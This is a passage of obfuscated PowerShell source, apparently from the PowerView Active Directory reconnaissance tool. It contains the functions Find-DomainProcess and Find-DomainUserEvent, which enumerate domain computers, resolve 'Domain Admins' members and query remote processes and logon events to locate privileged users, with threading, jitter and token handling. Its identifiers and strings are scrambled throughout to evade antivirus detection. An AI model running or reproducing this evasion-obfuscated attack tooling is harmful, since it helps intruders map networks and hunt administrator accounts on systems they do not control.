                ("{3}{1}{0}{2}" -f 'e','g','tUsers','Tar') = ${Tar`G`ETUSERS}
                ("{2}{0}{1}"-f'ent','User','Curr') = ${cU`Rr`EntuSer}
                ("{0}{2}{1}"-f'St','lth','ea') = ${sT`ealtH}
                ("{2}{3}{0}{1}" -f'andl','e','To','kenH') = ${lOg`oNTOK`eN}
            }

            &("{0}{2}{1}{5}{4}{3}" -f'New-','e','Thread','tion','nc','dFu') -ComputerName ${ta`RG`etco`M`pu`TERS} -ScriptBlock ${H`o`s`TENum`BloCK} -ScriptParameters ${scRI`PtP`ARA`Ms} -Threads ${ThRE`ADS}
        }
    }

    END {
        if (${Lo`goN`ToKEN}) {
            &("{0}{1}{3}{2}" -f 'Invoke','-Reve','elf','rtToS') -TokenHandle ${lO`gon`ToKEn}
        }
    }
}

function FInD-DOmAIN`pR`O`CE`sS {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{1}{2}" -f'ul','d','Process','PSSho'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}{3}"-f 'ePSC','SUs','P','redentialType'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{5}{2}{6}{3}{0}{1}" -f'inTe','xtForPassword','n','Pla','P','SAvoidUsi','g'}, '')]
    [OutputType({"{2}{0}{4}{5}{1}{3}"-f'rVie','serProc','Powe','ess','w','.U'})]
    [CmdletBinding(DEfAuLtpARametErSETNamE = {"{0}{1}"-f'No','ne'})]
    Param(
        [Parameter(PoSiTion = 0, ValueFRomPiPELInE = ${T`RuE}, VALuEFROmPiPELiNebyproPErtYName = ${t`Rue})]
        [Alias({"{2}{3}{0}{1}"-f'tNam','e','DNS','Hos'})]
        [String[]]
        ${coM`pUt`ERn`AMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOMa`in},

        [ValidateNotNullOrEmpty()]
        [String]
        ${ComP`UtE`RdO`Ma`in},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOm`PUt`eRl`D`APfIL`T`ER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`MPuTERS`EAr`Chb`ASE},

        [Alias({"{1}{0}{3}{2}" -f 'cons','Un','ined','tra'})]
        [Switch]
        ${COmpu`TEru`N`conSTrAInEd},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{3}{1}" -f'Op','ngSystem','era','ti'})]
        [String]
        ${CO`m`pu`TERoper`A`TinGs`YSTEM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'Pack','ervice','S'})]
        [String]
        ${cOMput`ErSE`RvI`Ce`P`A`cK},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'e','iteNam','S'})]
        [String]
        ${coMpuTeRS`I`TE`Na`ME},

        [Parameter(paRamETerSetNAME = "tARgEt`P`ROc`EsS")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`oC`EsSNa`ME},

        [Parameter(paraMETeRsETNAME = "tARG`Et`USer")]
        [Parameter(pArAMEtERSETNAME = "USeR`I`DEntitY")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${u`SeRID`en`TI`TY},

        [Parameter(pARamETeRsETNaMe = "TAr`g`EtUSer")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${US`ERD`Om`AiN},

        [Parameter(PARAMeteRSETnaMe = "TARGEt`US`eR")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${uS`ER`LDAp`Fi`LtER},

        [Parameter(PARaMeTeRsetnaME = "t`A`RGETUSER")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${uS`eR`Sea`RCHBa`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'Group','me','Na'}, {"{1}{0}" -f 'oup','Gr'})]
        [String[]]
        ${USeR`gR`o`UpI`dEntI`Ty} = ("{4}{0}{1}{3}{2}"-f'ain',' Ad','s','min','Dom'),

        [Parameter(paRAMeTeRseTname = "taRG`ET`Us`er")]
        [Alias({"{0}{2}{1}"-f'Admi','t','nCoun'})]
        [Switch]
        ${U`serADM`iNc`O`Unt},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{1}{0}{2}{3}" -f 'ontr','nC','oll','er','Domai'})]
        [String]
        ${se`RvER},

        [ValidateSet({"{0}{1}" -f 'B','ase'}, {"{1}{0}"-f 'Level','One'}, {"{1}{0}{2}" -f 'b','Su','tree'})]
        [String]
        ${sEArcHS`Co`Pe} = ("{0}{2}{1}"-f 'Subt','e','re'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEsULt`PA`G`ESize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`eRver`TIMELI`mIt},

        [Switch]
        ${T`ombsto`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`edeN`T`iAl} =  (&("{0}{2}{3}{1}" -f 'GET-','iABLe','VA','r') ("{0}{2}{1}" -f'pKF','zn','e')  )."VaL`Ue"::"E`mPTy",

        [Switch]
        ${STOPO`Ns`U`CcESs},

        [ValidateRange(1, 10000)]
        [Int]
        ${D`eLaY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${J`Itt`er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${TH`READs} = 20
    )

    BEGIN {
        ${CO`M`PU`TE`R`s`EAr`cHErARGUmEnTs} = @{
            ("{2}{1}{0}" -f 's','tie','Proper') = ("{2}{0}{1}{3}"-f 's','tna','dnsho','me')
        }
        if (${p`S`BOU`NDpara`m`eTerS}[("{1}{0}" -f'n','Domai')]) { ${Co`MpUte`R`SEarC`herARG`UM`entS}[("{0}{1}"-f 'Do','main')] = ${d`OmAIn} }
        if (${PsboU`NdPa`RA`mEt`erS}[("{1}{3}{0}{2}" -f 'erDoma','Compu','in','t')]) { ${COm`pUT`Er`s`EA`RcH`ERaRGU`mEntS}[("{1}{0}"-f 'in','Doma')] = ${co`mpUtERDoMA`in} }
        if (${p`s`Bo`UN`dPArAMeterS}[("{0}{2}{1}{3}"-f'Com','l','puterLDAPFi','ter')]) { ${ComPU`TerS`eaRche`R`ARGumeNTS}[("{2}{0}{1}" -f'APFil','ter','LD')] = ${COmPuT`ERLd`A`pf`iLT`er} }
        if (${p`SboUNDpaR`A`m`ETe`RS}[("{3}{1}{2}{0}" -f'e','mputerSear','chBas','Co')]) { ${Co`mP`U`T`erSEARC`her`AR`gumentS}[("{1}{0}{2}{3}"-f'a','Se','rchBa','se')] = ${coMp`UTERsE`A`RcHBAsE} }
        if (${psb`OUNdpa`RAmETE`Rs}[("{3}{1}{2}{0}"-f 'ed','o','nstrain','Unc')]) { ${COmPU`TErSeaR`cHERaR`G`U`m`eNts}[("{3}{0}{1}{2}"-f'nconstra','ine','d','U')] = ${U`NCOnst`Ra`iNed} }
        if (${P`S`BouNdpARAM`et`ers}[("{1}{0}{2}{3}"-f 'o','C','mputerOpera','tingSystem')]) { ${cOM`PU`TERSeArChErA`R`guM`ENTs}[("{2}{1}{3}{4}{0}"-f 'ystem','erat','Op','in','gS')] = ${o`pEr`A`TingsysTEM} }
        if (${Ps`BOu`NDp`AR`AmEtErS}[("{1}{0}{4}{2}{3}" -f'omputerS','C','ice','Pack','erv')]) { ${cOmPUteRSe`Ar`c`HerArg`UmE`NTs}[("{2}{0}{1}" -f 'vic','ePack','Ser')] = ${SErVi`C`eP`ACK} }
        if (${pSbOun`dp`Aram`E`T`eRs}[("{1}{3}{2}{0}" -f 'e','ComputerSi','Nam','te')]) { ${cOmp`UTeR`s`EA`RcHERaRGuMEnTs}[("{2}{0}{1}"-f 'iteNam','e','S')] = ${SI`T`EnaMe} }
        if (${pSB`ou`Nd`PAr`AMET`eRS}[("{2}{1}{0}"-f'er','rv','Se')]) { ${COM`P`U`TerSearCHERarg`UMents}[("{2}{0}{1}" -f've','r','Ser')] = ${SeRV`eR} }
        if (${pSB`OUnd`p`ARA`MEtERS}[("{2}{1}{0}"-f 'e','p','SearchSco')]) { ${cOmputERs`EARc`HE`RaRg`UM`En`Ts}[("{1}{3}{2}{0}" -f 'e','Sear','p','chSco')] = ${Se`A`RCh`scopE} }
        if (${P`sBO`U`NDPAr`AM`Eters}[("{0}{2}{1}{3}{4}"-f'R','ultPageS','es','iz','e')]) { ${Co`m`pUt`ERSEaR`c`herArgumEn`Ts}[("{3}{4}{2}{0}{1}"-f 'z','e','ltPageSi','R','esu')] = ${Re`sul`TPA`gesIze} }
        if (${Psbou`NDP`A`RameTE`RS}[("{1}{3}{0}{2}" -f'im','S','eLimit','erverT')]) { ${c`omPUtERSe`ARC`HERa`RGu`MENTS}[("{3}{0}{1}{2}"-f 'verTim','eL','imit','Ser')] = ${s`eRver`TI`mEl`IMit} }
        if (${PS`BO`UNdPAr`AMe`TErS}[("{1}{2}{0}"-f'ne','Tomb','sto')]) { ${cOMPu`T`e`RsEARch`eRaRgumE`NTS}[("{2}{0}{1}" -f'n','e','Tombsto')] = ${tO`MbSTo`NE} }
        if (${PSB`OuNdp`AR`AME`T`eRs}[("{1}{3}{0}{2}" -f 'a','Cred','l','enti')]) { ${cO`mp`UtE`R`SeaRcHe`RArGUMe`NTs}[("{3}{2}{0}{1}" -f'dent','ial','e','Cr')] = ${CRed`Ent`I`Al} }

        ${U`SersEaR`cHeRARGu`mE`NTs} = @{
            ("{1}{2}{0}"-f 's','Prope','rtie') = ("{1}{0}{3}{2}" -f 'count','samac','me','na')
        }
        if (${PSBoUnd`PARaM`eT`e`Rs}[("{2}{0}{3}{1}" -f 'erIde','ity','Us','nt')]) { ${USE`RsEAr`cH`ER`A`RgumEnts}[("{1}{2}{0}"-f 'entity','I','d')] = ${uS`e`R`I`DenTItY} }
        if (${PSbOUNdPA`RAm`e`Ters}[("{0}{1}" -f'Dom','ain')]) { ${UsERse`A`Rc`her`ArGuMeNTS}[("{0}{1}" -f'D','omain')] = ${DOMa`In} }
        if (${PSBOuNdp`Ar`A`met`Ers}[("{0}{1}{2}"-f'Use','rDomai','n')]) { ${uSE`R`S`EarC`hera`Rg`UmEnTS}[("{2}{0}{1}"-f'o','main','D')] = ${UseRd`Om`Ain} }
        if (${p`Sb`OuNDPAR`A`m`Eters}[("{0}{3}{2}{1}"-f'Us','r','DAPFilte','erL')]) { ${U`SErSeaR`CH`Er`Argu`MeN`Ts}[("{1}{2}{0}" -f 'lter','LDAPF','i')] = ${USeRLD`ApF`i`lT`ER} }
        if (${pSbO`UNDPA`Rame`TerS}[("{3}{0}{1}{2}{4}"-f'Se','a','rchBa','User','se')]) { ${USErS`Ea`R`ChER`ARgUmE`N`TS}[("{2}{0}{1}" -f 'rchBa','se','Sea')] = ${USe`RseArCh`BasE} }
        if (${P`SbouNDP`A`R`AmeTERs}[("{0}{2}{1}" -f'Us','ount','erAdminC')]) { ${UsE`RSE`A`R`cHeRaRGume`N`Ts}[("{0}{2}{1}" -f 'AdminCo','t','un')] = ${Us`E`RadM`I`NcoUnT} }
        if (${pS`Bound`pA`RaMeT`e`Rs}[("{1}{0}" -f'r','Serve')]) { ${uS`E`RSeAR`Ch`E`RaRGuMents}[("{1}{0}" -f'rver','Se')] = ${sE`R`Ver} }
        if (${psboUnDP`A`Ra`meTeRs}[("{1}{0}{3}{2}"-f'arch','Se','cope','S')]) { ${U`SeRSEA`R`CHERARgu`MENts}[("{2}{0}{1}" -f'arc','hScope','Se')] = ${sEArc`HScO`PE} }
        if (${PS`BOUNDpAR`A`m`ETerS}[("{0}{1}{2}{3}"-f 'Resu','ltPageS','i','ze')]) { ${us`ersearCheR`A`RgUmEN`Ts}[("{2}{4}{0}{3}{1}" -f'g','ze','Resu','eSi','ltPa')] = ${R`Es`UltpAgeSi`zE} }
        if (${p`S`BOUnDP`ARa`me`TeRS}[("{4}{3}{1}{2}{0}"-f 'mit','Ti','meLi','erver','S')]) { ${uS`eRseArCH`e`RA`RgUMents}[("{0}{3}{2}{1}" -f 'Se','t','imeLimi','rverT')] = ${SEr`VERti`m`EliMIt} }
        if (${P`SB`OUnD`pAraMEteRs}[("{0}{2}{1}"-f'Tomb','e','ston')]) { ${usE`RSEar`CherArgum`EN`Ts}[("{1}{0}{2}"-f 'on','Tombst','e')] = ${T`om`Bstone} }
        if (${PSbOUnd`p`ArA`Me`Te`RS}[("{1}{2}{0}" -f'tial','C','reden')]) { ${USe`R`SEa`RCH`ErArGu`MEn`Ts}[("{2}{3}{1}{0}"-f 'al','ti','Crede','n')] = ${cr`Eden`T`ial} }

        if (${PsbO`UN`dparAMEt`ERs}[("{0}{1}{2}" -f 'Com','pu','terName')]) {
            ${T`A`Rg`etcomP`UT`ers} = ${coMP`UtEr`Na`ME}
        }
        else {
            &("{2}{1}{0}"-f'se','-Verbo','Write') ("{2}{6}{1}{8}{9}{0}{7}{10}{5}{4}{3}" -f'ers in','main','[Find-','n','mai','o','Do',' t','Process] Querying comp','ut','he d')
            ${T`AR`gE`TComP`UTERs} = &("{2}{1}{3}{0}"-f 'er','C','Get-Domain','omput') @ComputerSearcherArguments | &("{3}{2}{1}{4}{0}"-f'ct','t-','lec','Se','Obje') -ExpandProperty ("{0}{1}{2}" -f'd','nshos','tname')
        }
        &("{2}{0}{1}{3}"-f 'Ve','rb','Write-','ose') "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length) "
        if (${TA`RGEtc`OMPUTerS}."LE`NgTH" -eq 0) {
            throw ("{9}{5}{11}{6}{10}{3}{2}{0}{8}{12}{7}{13}{1}{4}" -f 'No h','r','ss] ','oce','ate','i','ai','d to ','osts fou','[F','nPr','nd-Dom','n','enume')
        }

        if (${pSBound`pa`RAme`T`eRS}[("{1}{3}{0}{2}"-f'essNa','Pro','me','c')]) {
            ${Tar`get`p`RoCE`SSnAME} = @()
            ForEach (${T} in ${PR`OcEsSNA`ME}) {
                ${TaRgETpr`oCE`SsN`A`Me} += ${t}.("{1}{0}"-f'plit','S').Invoke(',')
            }
            if (${TARGeTpr`O`cEssNA`me} -isnot [System.Array]) {
                ${T`AR`G`ETPRoc`esSnA`Me} = [String[]] @(${t`ARgetprOCesSn`A`ME})
            }
        }
        elseif (${p`SbOuN`dpARaM`eTERs}[("{2}{0}{1}{3}" -f 'd','en','UserI','tity')] -or ${PSB`ou`NDp`AraME`TERs}[("{0}{2}{1}" -f'Us','ter','erLDAPFil')] -or ${P`sbOUNdP`A`R`AmEt`Ers}[("{1}{0}{2}{3}" -f 'serSe','U','archBas','e')] -or ${PSBoU`NDP`Ar`A`Me`TErs}[("{1}{3}{2}{4}{0}" -f'Count','U','rAdm','se','in')] -or ${pS`BOUnd`PARAmeTE`RS}[("{3}{0}{1}{4}{2}" -f'low','Del','ion','UserAl','egat')]) {
            ${tAR`g`et`USers} = &("{2}{1}{0}"-f 'User','Domain','Get-') @UserSearcherArguments | &("{1}{2}{0}"-f 't','Se','lect-Objec') -ExpandProperty ("{1}{2}{4}{3}{0}" -f 'tname','sam','ac','oun','c')
        }
        else {
            ${G`Ro`UpsEAr`ChErA`R`GUMEn`TS} = @{
                ("{1}{0}" -f'y','Identit') = ${uS`erg`RoUP`IDe`NT`Ity}
                ("{0}{1}" -f'R','ecurse') = ${t`RUE}
            }
            if (${PsBouND`pAR`Am`EteRS}[("{2}{1}{0}"-f 'in','serDoma','U')]) { ${GrOUPSeARch`E`R`ARgUm`Ents}[("{0}{1}"-f'Domai','n')] = ${U`s`er`DOMain} }
            if (${p`SBo`Und`pARA`metE`RS}[("{2}{0}{1}{4}{3}"-f 'er','SearchB','Us','se','a')]) { ${gR`oU`p`sea`R`Ch`er`ARGuMentS}[("{1}{2}{0}" -f 'se','Searc','hBa')] = ${USeRs`EArc`HB`AsE} }
            if (${P`sBOundpArA`me`TerS}[("{1}{0}" -f'ver','Ser')]) { ${g`ROuPS`eARc`HER`A`RGU`MeNTs}[("{1}{0}" -f'erver','S')] = ${S`erV`er} }
            if (${PSBOu`N`D`parAMete`RS}[("{3}{1}{0}{2}"-f 'op','Sc','e','Search')]) { ${g`Ro`UP`S`EARcHEr`ARgume`NtS}[("{2}{1}{3}{0}" -f 'e','earchSco','S','p')] = ${sEAr`chSCO`Pe} }
            if (${pSbouND`P`Ar`AmEtE`Rs}[("{2}{0}{3}{1}{4}"-f'su','Pag','Re','lt','eSize')]) { ${grOup`SeA`R`CHER`ArgUme`N`Ts}[("{2}{0}{1}{3}"-f'esult','Pa','R','geSize')] = ${ResuL`T`pagEsIZe} }
            if (${p`SBOU`N`dPar`AMETeRs}[("{1}{2}{0}"-f't','ServerT','imeLimi')]) { ${GRouP`Sea`R`chERAr`GU`ME`NTs}[("{0}{3}{1}{2}" -f'ServerTime','m','it','Li')] = ${serV`e`RTI`Me`LIMiT} }
            if (${PsbO`Und`PAramEt`e`RS}[("{2}{0}{1}" -f 'om','bstone','T')]) { ${G`RoupseaR`CHEr`AR`g`UMe`NtS}[("{2}{1}{0}"-f 'bstone','m','To')] = ${t`oM`BStONE} }
            if (${P`SB`oU`NDpaRaM`eTeRs}[("{2}{0}{1}"-f'n','tial','Crede')]) { ${Gr`ouPSea`R`ChEr`ARgUmENTS}[("{0}{1}{2}" -f 'Cred','en','tial')] = ${C`ReD`ENt`ial} }
            ${grou`PsEArC`HERa`RGUM`E`Nts}
            ${T`ArgetuS`e`Rs} = &("{0}{1}{3}{2}" -f 'Get-Doma','in','Member','Group') @GroupSearcherArguments | &("{1}{2}{3}{0}" -f 'ect','Se','lect-','Obj') -ExpandProperty ("{2}{0}{1}"-f'mb','erName','Me')
        }

        ${H`OsTENum`BLo`Ck} = {
            Param(${COmpute`R`NaME}, ${P`ROc`EssnaMe}, ${t`A`RgETUSe`RS}, ${CRE`D`ENtial})

            ForEach (${tA`RgeTcOM`pu`T`eR} in ${cOm`P`UtE`Rname}) {
                ${u`p} = &("{1}{0}{2}{3}" -f'Co','Test-','nnecti','on') -Count 1 -Quiet -ComputerName ${tArGET`Co`m`PuTEr}
                if (${U`P}) {

                    if (${cre`dEnT`i`AL}) {
                        ${p`ROCEss`eS} = &("{3}{1}{0}{2}"-f 'WMI','t-','Process','Ge') -Credential ${cRED`en`TiAl} -ComputerName ${Ta`RgET`CO`MPu`TeR} -ErrorAction ("{2}{0}{4}{3}{1}"-f'ile','nue','S','onti','ntlyC')
                    }
                    else {
                        ${p`ROcESS`eS} = &("{1}{3}{2}{0}" -f 'ss','Get-','oce','WMIPr') -ComputerName ${Targ`e`TcOmp`UTeR} -ErrorAction ("{1}{0}{3}{2}"-f 'ntlyCont','Sile','e','inu')
                    }
                    ForEach (${PR`oC`esS} in ${PR`oc`esSes}) {

                        if (${p`ROc`esSn`AMe}) {
                            if (${p`ROc`esSnAmE} -Contains ${p`Ro`cesS}."pro`ceS`sn`AmE") {
                                ${PR`OcEss}
                            }
                        }

                        elseif (${taRG`e`TUs`Ers} -Contains ${Pr`ocE`sS}."U`ser") {
                            ${Pr`OcE`ss}
                        }
                    }
                }
            }
        }
    }

    PROCESS {

        if (${ps`Bo`Un`DPARA`METErs}[("{0}{1}" -f 'Dela','y')] -or ${pSBounD`pARA`MeT`e`RS}[("{1}{3}{0}{2}"-f'Su','S','ccess','topOn')]) {

            &("{2}{1}{3}{0}"-f'rbose','te-','Wri','Ve') "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count) "
            &("{1}{2}{3}{0}"-f'erbose','Write','-','V') ('[Find-DomainP'+'rocess'+']'+' '+'D'+'el'+'ay: '+"$Delay, "+'Jitter'+':'+' '+"$Jitter")
            ${couN`T`er} = 0
            ${RAnD`No} = &("{1}{0}{2}"-f'ew-Ob','N','ject') ("{0}{2}{1}" -f 'S','tem.Random','ys')

            ForEach (${Ta`RG`etco`mputeR} in ${TA`RgEtC`OMp`UTE`RS}) {
                ${cou`N`TEr} = ${coU`N`Ter} + 1

                &("{2}{1}{0}" -f't-Sleep','tar','S') -Seconds ${r`AndNO}.("{0}{1}" -f'Ne','xt').Invoke((1-${jI`T`TEr})*${dEL`AY}, (1+${J`i`TTeR})*${d`e`LAY})

                &("{2}{1}{0}"-f'-Verbose','e','Writ') "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                ${Res`U`Lt} = &("{2}{1}{0}" -f 'mmand','voke-Co','In') -ScriptBlock ${h`OsT`EnUMBLoCk} -ArgumentList ${t`ARg`etc`OMP`UTEr}, ${T`ArGETpRoCesSn`A`Me}, ${TAR`g`EtusE`RS}, ${cRe`d`enTIAL}
                ${r`ESult}

                if (${r`Esu`Lt} -and ${sTO`P`on`SUC`cESS}) {
                    &("{1}{4}{0}{2}{3}" -f 'e-Ve','Wri','rbo','se','t') ("{1}{2}{4}{8}{3}{9}{10}{6}{0}{7}{5}" -f' ','[Find-D','omai','ro','n','nd, returning early','] Target user','fou','P','c','ess')
                    return
                }
            }
        }
        else {
            &("{1}{3}{0}{2}"-f '-V','Writ','erbose','e') ('[Find-Do'+'mainP'+'roce'+'ss] '+'Usin'+'g '+'t'+'hrea'+'d'+'ing '+'with'+' '+'thr'+'ea'+'ds: '+"$Threads")

            ${sC`RIptpArA`mS} = @{
                ("{2}{1}{0}" -f 'ssName','oce','Pr') = ${TaRgE`TP`Roc`Es`sNa`mE}
                ("{0}{3}{1}{2}" -f 'Tar','U','sers','get') = ${TaR`getU`se`Rs}
                ("{3}{2}{0}{1}" -f 'en','tial','ed','Cr') = ${cr`E`deN`TIAL}
            }

            &("{1}{0}{4}{2}{3}{5}{6}"-f 'h','New-T','ea','dedF','r','unct','ion') -ComputerName ${t`A`RgEtCoMPuTe`RS} -ScriptBlock ${ho`s`TENUMBLock} -ScriptParameters ${sc`RIptPa`R`AMS} -Threads ${t`hrEa`Ds}
        }
    }
}

function FIND-dOM`AINus`e`ReV`e`Nt {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{2}{1}" -f 'P','Process','Should','S'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{6}{4}{2}{5}" -f'PS','eDeclared','t','Us','ThanAssignmen','s','VarsMore'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{1}{0}{2}{4}{3}" -f'SCre','SUseP','denti','e','alTyp','P'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{3}{1}{2}{5}" -f 'PSA','lainTextFor','P','P','voidUsing','assword'}, '')]
    [OutputType({"{2}{3}{4}{0}{1}" -f'nEve','nt','Po','werView.L','ogo'})]
    [OutputType({"{3}{0}{7}{10}{6}{1}{2}{8}{5}{9}{4}"-f 'e','Expli','citCre','Pow','n','ent','.','r','d','ialLogo','View'})]
    [CmdletBinding(DeFAUltParamEtErSETName = {"{1}{0}{2}"-f'ai','Dom','n'})]
    Param(
        [Parameter(ParAMETERsETNAme = "CoMP`UTErn`A`ME", pOsiTIoN = 0, VALUefRoMpiPELiNE = ${t`RUE}, VaLUEFrOmPiPELInEByPROpertyNaME = ${tR`UE})]
        [Alias({"{2}{0}{3}{1}" -f 'sh','e','dn','ostnam'}, {"{2}{0}{1}"-f's','tName','Ho'}, {"{0}{1}"-f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`OMpU`T`Er`NAmE},

        [Parameter(PARamEtERSeTnAmE = "D`Om`AIN")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${do`Main},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${F`ILTeR},

        [Parameter(valUEfROmPipEliNEbYPrOpERtyNAmE = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${s`TArTTi`me} =  (  &("{1}{2}{0}" -f'IaBle','GET-va','R') ("{1}{0}" -f 'O','0d')  )."va`Lue"::"N`OW".("{2}{1}{0}"-f 's','ay','AddD').Invoke(-1),

        [Parameter(vaLUEFrOMPipeLINebypRopeRtyNamE = ${TR`Ue})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${en`DT`Ime} =  ${0`dO}::"n`OW",

        [ValidateRange(1, 1000000)]
        [Int]
        ${m`AXEvEn`Ts} = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${USer`idE`Nt`ITY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${u`sEr`Dom`AiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${u`SEr`Ld`APfIl`TER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${u`seRSE`ArChb`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{1}{0}" -f'upName','o','G','r'}, {"{1}{0}"-f'p','Grou'})]
        [String[]]
        ${USer`gROu`PI`dEnT`Ity} = ("{2}{0}{1}"-f 'ma','in Admins','Do'),

        [Alias({"{1}{0}{2}"-f'm','Ad','inCount'})]
        [Switch]
        ${u`Sera`dm`InCount},

        [Switch]
        ${C`hecK`ACCE`Ss},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{0}{4}{2}" -f'main','o','ntroller','D','Co'})]
        [String]
        ${sE`R`VeR},

        [ValidateSet({"{1}{0}" -f 'e','Bas'}, {"{1}{0}{2}" -f 'v','OneLe','el'}, {"{2}{1}{0}"-f 'ee','btr','Su'})]
        [String]
        ${s`EA`RcH`SCoPE} = ("{2}{1}{0}" -f'ree','bt','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${res`ULt`paG`EsiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`RV`eRTimE`L`IMiT},

        [Switch]
        ${t`oMbS`T`onE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRE`dENT`iAL} =  ${PKf`E`zN}::"Em`PTy",

        [Switch]
        ${sTO`pOnsUcC`ess},

        [ValidateRange(1, 10000)]
        [Int]
        ${del`Ay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${j`ITteR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${th`Re`ADS} = 20
    )

    BEGIN {
        ${UserSea`R`CHe`Rarg`UM`EN`Ts} = @{
            ("{0}{1}{2}"-f'Proper','t','ies') = ("{2}{1}{3}{0}"-f 'ame','ccount','sama','n')
        }
        if (${psbo`U`NdPARAmETe`Rs}[("{0}{1}{2}{3}"-f'U','serIden','ti','ty')]) { ${uSErSE`Arc`heRArguM`eNTS}[("{1}{0}"-f 'ty','Identi')] = ${U`S`Eri`DENTi`TY} }
        if (${Psb`oun`DparAM`e`TERS}[("{2}{1}{0}" -f 'in','erDoma','Us')]) { ${uSeRsearChE`R`AR`guM`e`NTS}[("{1}{2}{0}"-f 'n','D','omai')] = ${UsERDom`A`in} }
        if (${pS`BOuNDP`Ar`A`METerS}[("{0}{1}{2}"-f'UserLDAP','Filte','r')]) { ${US`ER`sEARC`h`eraRGUmE`NTS}[("{2}{0}{1}" -f'APFi','lter','LD')] = ${UsE`R`LDAp`FiLt`er} }
        if (${Ps`BO`UNdPARA`MEterS}[("{3}{2}{0}{1}"-f'hBa','se','rSearc','Use')]) { ${U`S`ERsEA`RChe`RARgUm`EN`Ts}[("{3}{2}{0}{1}"-f'rch','Base','ea','S')] = ${USe`RSea`RchbASE} }
        if (${psb`OuN`Dp`A`Ra`mETeRs}[("{4}{2}{0}{1}{3}" -f 'n','Coun','i','t','UserAdm')]) { ${u`seRs`EarCH`eR`A`RgU`MEntS}[("{1}{2}{0}" -f't','Admi','nCoun')] = ${U`se`RADM`iN`CoUnT} }
        if (${p`SBOUn`DPAra`m`etErS}[("{0}{1}{2}" -f'Se','rve','r')]) { ${u`sERs`e`ArCH`e`RArgUMeNTS}[("{1}{0}" -f'erver','S')] = ${SE`RvEr} }
        if (${PSboun`dp`AraMe`TeRs}[("{0}{3}{1}{2}"-f 'Search','cop','e','S')]) { ${uSerS`eaRCHe`RArGUme`N`TS}[("{2}{0}{1}" -f 'arc','hScope','Se')] = ${seaRCHS`C`OPe} }
        if (${P`sBouNd`par`AmETe`RS}[("{4}{2}{1}{3}{0}"-f 'e','sultP','e','ageSiz','R')]) { ${useRsEaRC`H`eRA`RGumen`TS}[("{1}{2}{0}{3}"-f'S','Res','ultPage','ize')] = ${R`eSUL`Tp`AGe`SIZe} }
        if (${pSb`OUnDpARa`m`eTeRS}[("{0}{3}{2}{1}"-f 'Ser','imit','L','verTime')]) { ${useRsEAR`CHErAR`GumEN`TS}[("{1}{3}{2}{0}"-f 'mit','S','rverTimeLi','e')] = ${se`RV`ert`imeliMIT} }
        if (${P`SBoUn`d`PAr`AMe`TerS}[("{2}{0}{1}{3}" -f 'o','mbst','T','one')]) { ${uSe`RsEARCHeRA`RGu`ME`NtS}[("{0}{1}{2}" -f 'T','ombst','one')] = ${tOmB`StO`NE} }
        if (${PSB`OuNDPArA`M`ETers}[("{0}{1}{2}" -f 'Cre','de','ntial')]) { ${uSErseArch`erAR`G`UME`NTS}[("{0}{2}{1}"-f 'C','ential','red')] = ${cREde`Nt`iAl} }

        if (${pSb`ounDPa`RAMe`Ters}[("{2}{1}{0}{3}"-f'de','I','User','ntity')] -or ${Ps`Bo`UNDPArAM`ET`eRS}[("{1}{3}{2}{0}" -f'ter','UserL','il','DAPF')] -or ${Ps`BO`UNdP`AraMEtERS}[("{2}{4}{0}{3}{1}"-f'B','e','UserS','as','earch')] -or ${Ps`BoU`NdPAr`A`m`eTeRs}[("{4}{1}{2}{3}{0}" -f'nt','Adm','inC','ou','User')]) {
            ${TAR`GE`TU`SERs} = &("{0}{1}{2}" -f'Get-','Doma','inUser') @UserSearcherArguments | &("{1}{0}{2}"-f 'ect-','Sel','Object') -ExpandProperty ("{1}{2}{3}{0}"-f'name','sam','accou','nt')
        }
